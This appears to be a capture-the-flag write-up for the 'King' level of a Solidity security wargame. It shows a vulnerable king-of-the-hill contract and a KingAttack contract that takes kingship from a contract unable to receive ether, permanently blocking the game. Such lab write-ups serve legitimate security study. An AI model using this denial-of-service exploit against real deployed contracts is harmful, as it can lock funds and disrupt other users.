# Challenge 9

<img src="./images/BigLevel9.svg" alt="9" >

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

Challenge
---
> The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

  Such a fun game. Your goal is to break it.

  When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

Solution 
---
1. You have to owner or you need to send greater than or equal prize amount in contract. Here's The Code make the call from the other contract with equal or greater prize amount then you will beat level. Here's The Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    King  kingAddress;

    constructor(address payable _addr) public {
        kingAddress = King(_addr);
    }

    function solve() public payable {
        require(msg.value >= 1000000000000001);
        (bool success,) = address(kingAddress).call{value:msg.value}("");
        require(success);
    }
}
```

Take the Instance Address and Deploy KingAttack Contract With it then send the amount, now open the terminal 
```js
await contract._king()
```
you will see contract address, now submit the instance your challenge will be cleared.